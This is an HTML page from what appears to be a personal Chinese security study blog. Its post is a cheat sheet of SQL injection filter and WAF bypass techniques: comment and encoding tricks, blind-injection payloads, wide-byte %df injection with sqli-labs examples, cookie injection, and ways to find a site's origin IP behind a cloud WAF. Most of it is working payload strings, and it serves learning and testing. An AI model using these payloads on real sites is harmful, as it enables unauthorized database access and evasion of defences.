@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="明 尘">
+    
+    
+    
+    
+    
+    
+    <title>T1 | 文心雕龙</title>
+    <link href="http://example.com" rel="prefetch" />
+
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery.min.js"></script>
+
+    
+<script src="/js/bootstrap.min.js"></script>
+
+    
+<script src="/js/aos.js"></script>
+
+    
+<script src="/js/highslide/highslide-full.min.js"></script>
+
+    
+<link rel="stylesheet" href="/js/highslide/highslide.css">
+
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg,preview6.jpg,preview7.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="http://example.com">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">文心雕龙</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-list"></i>分类
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/web%E5%89%8D%E7%AB%AF/">web前端</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/php/">php</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/categories">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                
+                <li class="dropdown">
+                    <!-- TODO 添加hover dropdown效果 -->
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                       aria-haspopup="true" aria-expanded="false" data-hover="dropdown">
+                        <i class="fa fa-tags"></i>标签
+                    </a>
+                    <ul class="dropdown-menu">
+                        
+                        
+                        <li>
+                            <a href="/tags/Linux/">Linux</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/tags/DNS%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90/">DNS域名解析</a>
+                        </li>
+                        
+                        
+                        <li>
+                            <a href="/tags">...</a>
+                        </li>
+                        
+                        
+                    </ul>
+                </li>
+                
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="http://example.com">文心雕龙</a>
+        >
+        <span>T1</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2023/12/27/T1/">T1</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2023-12-27
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2023/12/27/T1/">T1</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2023-12-27
+            </p>
+            <p>
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h1 id="SQL注入绕过技术"><a href="#SQL注入绕过技术" class="headerlink" title="SQL注入绕过技术"></a>SQL注入绕过技术</h1><p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/l1028386804/article/details/118479086">https://blog.csdn.net/l1028386804/article/details/118479086</a></p>
+<h4 id="1-绕过空格（注释符-，-a0）"><a href="#1-绕过空格（注释符-，-a0）" class="headerlink" title="1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）"></a>1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）</h4><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p>
+<p>%20 %09 %0a %0b %0c %0d %a0 %00 &#x2F;**&#x2F;  &#x2F;<em>!</em>&#x2F;</p>
+<p>最基本的绕过方法，用注释替换空格：</p>
+<p> <code>select/**/schema_name/**/from/**/information_schema.schemata;</code></p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20231227192227435.png" alt="image-20231227192227435"></p>
+<p>使用浮点数：</p>
+<p>select * from users where id&#x3D;8E0union select 1,2,3<br>select * from users where id&#x3D;8.0 select 1,2,3</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20231227192848954.png" alt="image-20231227192848954"></p>
+<h4 id="2-括号绕过空格"><a href="#2-括号绕过空格" class="headerlink" title="2.括号绕过空格"></a>2.括号绕过空格</h4><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。<br>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>select(user())from dual where(1&#x3D;1)and(2&#x3D;2)</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20231227193123759.png" alt="image-20231227193123759"></p>
+<p>这个方法常用于时间盲注</p>
+<p>?id&#x3D;1%27and(sleep(ascii(mid(database()from(1)for(1)))&#x3D;109))%23</p>
+<h4 id="3-引号绕过（使用十六进制）"><a href="#3-引号绕过（使用十六进制）" class="headerlink" title="3.引号绕过（使用十六进制）"></a>3.引号绕过（使用十六进制）</h4><p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT column_name <br>FROM information_schema.columns <br>WHERE table_name = <span class="hljs-string">&#x27;users&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20231228210710708.png" alt="image-20231228210710708"></p>
+<p>如果引号被过滤了，那么where子句就无法使用了。那么就要使用十六进制来处理这个问题了。<br>users的十六进制的字符串是7573657273。</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20231228211127400.png" alt="image-20231228211127400"></p>
+<h4 id="4-逗号绕过（使用from或者offset）"><a href="#4-逗号绕过（使用from或者offset）" class="headerlink" title="4.逗号绕过（使用from或者offset）"></a>4.逗号绕过（使用from或者offset）</h4><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
+<p>select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);</p>
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20231228211311851.png" alt="image-20231228211311851"></p>
+<p>使用join：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>     #等价于<br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>)a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">2</span>)b<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20231228220628781.png" alt="image-20231228220628781"></p>
+<p>使用like：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> ascii(mid(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">80</span>   #等价于<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;r%&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20231228220810433.png" alt="image-20231228220810433"></p>
+<p>对于limit可以使用offset来绕过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br># 等价于<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> news limit <span class="hljs-number">1</span> <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="5-比较符号（）绕过"><a href="#5-比较符号（）绕过" class="headerlink" title="5.比较符号（&lt;&gt;）绕过"></a>5.比较符号（&lt;&gt;）绕过</h4><p>（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</p>
+<p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）<br>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。</p>
+<p>如果比较操作符被过滤，有些盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">64</span><br>#那么上面的这条<span class="hljs-keyword">sql</span>语句可以使用greatest变为如下的子句:<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> greatest(ascii(substr(database(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">64</span>)<span class="hljs-operator">=</span><span class="hljs-number">64</span><br></code></pre></td></tr></table></figure>
+
+<p>使用between and：<br>between a and b：返回a，b之间的数据，不包含b。</p>
+<h4 id="6-or-and-xor-not绕过"><a href="#6-or-and-xor-not绕过" class="headerlink" title="6.or and xor not绕过"></a>6.or and xor not绕过</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">and</span><span class="hljs-operator">=</span><span class="hljs-operator">&amp;&amp;</span>  <span class="hljs-keyword">or</span><span class="hljs-operator">=</span><span class="hljs-operator">||</span>   xor<span class="hljs-operator">=</span><span class="hljs-operator">|</span>   <span class="hljs-keyword">not</span><span class="hljs-operator">=</span><span class="hljs-operator">!</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="7-绕过注释符号（-，–-后面跟一个空格））过滤"><a href="#7-绕过注释符号（-，–-后面跟一个空格））过滤" class="headerlink" title="7.绕过注释符号（#，–(后面跟一个空格））过滤"></a>7.绕过注释符号（#，–(后面跟一个空格））过滤</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3||&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20231229112807353.png" alt="image-20231229112807353"></p>
+<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,&#x27;</span><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tanlinhuitlh/123/main/img/image-20231229112853890.png" alt="image-20231229112853890"></p>
+<h4 id="8-绕过"><a href="#8-绕过" class="headerlink" title="8.&#x3D;绕过"></a>8.&#x3D;绕过</h4><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p>
+<h4 id="9-绕过union，select，where等"><a href="#9-绕过union，select，where等" class="headerlink" title="9.绕过union，select，where等"></a>9.绕过union，select，where等</h4><p><strong>（1）使用注释符绕过</strong></p>
+<p>常用注释符：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span>，<span class="hljs-comment">-- , /**/, #, --+, -- -, ;,%00,--a</span><br>#用法：<br>U<span class="hljs-comment">/**/</span> NION <span class="hljs-comment">/**/</span> SE<span class="hljs-comment">/**/</span> LECT <span class="hljs-comment">/**/</span>username，password <span class="hljs-keyword">from</span> users<br></code></pre></td></tr></table></figure>
+
+<p><strong>（2）使用大小写绕过</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UnIoN/**/SeLeCT</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>（3）内联注释绕过</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>双关键字绕过（若删除掉第一个匹配的union就能绕过）</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="10-通用绕过（编码）"><a href="#10-通用绕过（编码）" class="headerlink" title="10.通用绕过（编码）"></a>10.通用绕过（编码）</h4><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>即<span class="hljs-operator">%</span><span class="hljs-number">6</span>f<span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">31</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>d<span class="hljs-operator">%</span><span class="hljs-number">31</span>，而Test也可以为<span class="hljs-type">CHAR</span>(<span class="hljs-number">101</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">97</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>)<span class="hljs-operator">+</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">116</span>)。<br></code></pre></td></tr></table></figure>
+
+<h4 id="11-等价函数绕过"><a href="#11-等价函数绕过" class="headerlink" title="11.等价函数绕过"></a>11.等价函数绕过</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">hex()、bin() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> ascii()<br>sleep() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>benchmark()<br>concat_ws()<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span>group_concat()<br>mid()、substr() <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">substring</span>()<br>@<span class="hljs-variable">@user</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">user</span>()<br>@<span class="hljs-variable">@datadir</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> datadir()<br></code></pre></td></tr></table></figure>
+
+<p>例如substring()和substr()无法使用时：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">+</span><span class="hljs-keyword">and</span><span class="hljs-operator">+</span>ascii(<span class="hljs-built_in">lower</span>(mid((<span class="hljs-keyword">select</span><span class="hljs-operator">+</span>pwd<span class="hljs-operator">+</span><span class="hljs-keyword">from</span><span class="hljs-operator">+</span>users<span class="hljs-operator">+</span>limit<span class="hljs-operator">+</span><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<span class="hljs-operator">=</span><span class="hljs-number">74</span><br>#或者：<br>substr((<span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;password&#x27;</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0x70</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x69</span>) <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x70</span>) <span class="hljs-operator">=</span> <span class="hljs-number">0</span><br>strcmp(<span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">1</span>), <span class="hljs-number">0x71</span>) <span class="hljs-operator">=</span> <span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="12-宽字节注入"><a href="#12-宽字节注入" class="headerlink" title="12.宽字节注入"></a>12.宽字节注入</h4><p>​	西欧字母符号，通过1个字节来表示。东亚字符通过至少两个字节来表示。GBK编码就是用两个字节来表示中文区字符的一个编码标准。</p>
+<p>​	GBK编码依然采用双字节编码方案，其编码范围：8140－FEFE（高字节从81到FE，低字节从40到FE），剔除xx7F码位，共23940个码位。</p>
+<p>​	条件<br>后台使用GBK编码的时候，存在着看不见的ascii码转换为GBK编码的转换过程，可以使用宽字节注入。</p>
+<p>​	原理<br>编码转换存在着单字符被合并的情形</p>
+<p>​	 反斜杠对应url编码%5c，是单字节的。<br> 在%5c前再加入一个单字节字符%dd（范围可以是81到FE之间），就成了%dd%5c<br> 而当后端使用GBK编码的时候，会将合理的两个单字节ANSCII字符解析成一个双字节的GBK编码字符</p>
+<p>过滤 ’ 的时候往往利用的思路是将 ’ 转换为 ’ 。<br>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：<br>（1）%df 吃掉 \ 具体的方法是 urlencode(’) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：id&#x3D;-1%df%27union select 1,user(),3–+<br>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。<br>一般产生宽字节注入的PHP函数：<br>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \ 转为 \，将 “ 转为 “ 。用思路一。<br>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。HTTP参数污染</p>
+<p>例如sqli libs 32和33关,宽字节注入%df</p>
+<p>?id&#x3D;-1%df%27%20union%20select%201,group_concat(database()),3–+爆库</p>
+<h4 id="13-HTTP参数污染"><a href="#13-HTTP参数污染" class="headerlink" title="13.HTTP参数污染"></a>13.HTTP参数污染</h4><p>HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。</p>
+<h4 id="14-生僻函数"><a href="#14-生僻函数" class="headerlink" title="14.生僻函数"></a>14.生僻函数</h4><p>使用生僻函数替代常见的函数，例如在报错注入中使用polygon()函数替换常用的updatexml()函数，就是用不常用的报错函数试试。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>) f) x));<br></code></pre></td></tr></table></figure>
+
+<h4 id="15-注入参数到cookie中"><a href="#15-注入参数到cookie中" class="headerlink" title="15.注入参数到cookie中"></a>15.注入参数到cookie中</h4><p>​	某些程序员在代码中使用<code>$_REQUEST</code>获取参数，而<code>$_REQUEST</code>会依次从GET&#x2F;POST&#x2F;cookie中获取参数，如果WAF只检测了GET&#x2F;POST而没有检测cookie,则可以将注入语句放入cookie中进行绕过。一定要保证cookie还在存在的前提下进行抓包</p>
+<h4 id="16-云WAF绕过之寻找网站源ip"><a href="#16-云WAF绕过之寻找网站源ip" class="headerlink" title="16.云WAF绕过之寻找网站源ip"></a>16.云WAF绕过之寻找网站源ip</h4><p>​	采用云WAF的网站可以寻找网站真实ip来绕过云WAF的检测。<br>常见方法有：</p>
+<p>采用多地ping的方法查看ip地址解析分析真实ip<br>在线ping网站有：<br><a target="_blank" rel="noopener" href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a target="_blank" rel="noopener" href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a target="_blank" rel="noopener" href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a><br>使用 nslookup 进行检测，原理同上。<br>寻找网站历史解析记录。<br>找网站的二级域名、NS、MX记录等对应的ip。<br>订阅网站邮件，查看邮件发送方的ip。</p>
+
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            明 尘
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"></p>
+        </div>
+    </div>
+</aside>
+    
+    <aside id="sidebar-recent_comments">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-comments"></i>
+            最新评论
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush"></ul>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/28/T2/">T2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/27/T1/">T1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/22/python3/">python3</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/21/sql%E6%B3%A8%E5%85%A52/">sql注入2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/19/sql%E6%B3%A8%E5%85%A51/">sql注入1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/16/php%E5%AE%9E%E6%93%8D/">php实操</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/13/php%E5%AD%A6%E4%B9%A01/">php学习1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/12/php%E5%AD%A6%E4%B9%A0/">php学习</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/11/python%E5%AD%A6%E4%B9%A02/">python学习2</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/10/%E5%AE%89%E5%8D%93%E7%97%85%E6%AF%92%E7%9B%91%E5%90%AC/">安卓病毒监听</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    <aside id="sidebar-rand_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            随机文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/02/Linux%E5%91%BD%E4%BB%A4/">Linux命令</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2023/12/27/T1/">T1</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
